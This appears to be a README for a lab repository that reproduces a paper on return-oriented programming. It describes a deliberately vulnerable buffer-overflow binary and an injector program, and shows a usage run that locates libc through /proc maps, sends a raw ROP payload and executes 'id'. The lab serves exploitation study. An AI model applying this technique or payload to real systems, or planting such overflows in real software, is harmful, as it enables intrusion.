Original paper from Benjamin Randazzo <benjamin@linuxcrashing.org>
with source code transcripted for convenience.

There are also two test programs:

 - ``vuln``: a simple buffer overflow compiled without ``pie``
 - ``injecter``: a program that inject a ``ROP`` payload that executes the ``id`` command

Usage:

     $./injecter ./vuln
     [+] just forked pid 7887
     [+] forked './vuln'
     [>] Please enter your code: 
     [press RETURN key to continue] if you want to debug the injection attach it from gdb
    cmd: cat /proc/7887/maps | grep '/lib/i386-linux-gnu/i686/cmov/libc-2.19.so' | grep r-xp | cut --field=1 --delimiter='-'
     [+] libc base address: 0xf7526000
     [+] libc .data address: 0xf76cd040
     [<] AAAAAAAAAAAAAAAAAAAAAAAADCBA�7a�����/usr@�l�_;U��7a�����/binD�l�_;U��7a�����//idH�l�_;U��7a���������L�l�	^i�_;U�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�_;U��7a�����@�l�P�l�_;U��7a�T�l�P�l�����LOU�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R���S�@�l��EU�
     [>] uid=1000(packz) gid=1000(packz)

It's also possible to create an environment with

    $ sudo docker build --tag=smash-the-stack .
    $ sudo docker run -i -t smash-the-stack /bin/bash

# Link

 - http://www.shell-storm.org/blog/Return-Oriented-Programming-and-ROPgadget-tool/
 - http://tk-blog.blogspot.fr/2009/02/relro-not-so-well-known-memory.html
 - http://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
